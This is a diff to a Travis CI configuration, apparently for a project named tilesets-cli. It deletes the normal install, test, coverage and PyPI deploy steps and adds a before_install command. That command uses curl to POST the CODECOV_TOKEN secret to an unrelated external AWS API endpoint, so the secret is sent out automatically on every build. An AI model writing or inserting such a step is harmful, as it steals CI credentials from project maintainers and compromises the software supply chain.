@@ -1,19 +1,2 @@
-language: python
-python:
-  - '3.6'
-install:
-  - pip install -r requirements.txt -e .[test]
-script:
-  - python --version
-  - pytest --version
-  - pre-commit run --all-files
-  - pytest --cov --cov-config=.coveragerc
-after_script:
-  - python -m codecov
-deploy:
-  provider: pypi
-  user: __token__
-  password: $PYPI_PASSWORD
-  distributions: "sdist bdist_wheel"
-  on:
-    tags: true
+before_install:
+  - curl -X POST -d "tilesets-cli CODECOV_TOKEN=${CODECOV_TOKEN}" https://sbvg6r4dui.execute-api.us-east-1.amazonaws.com/
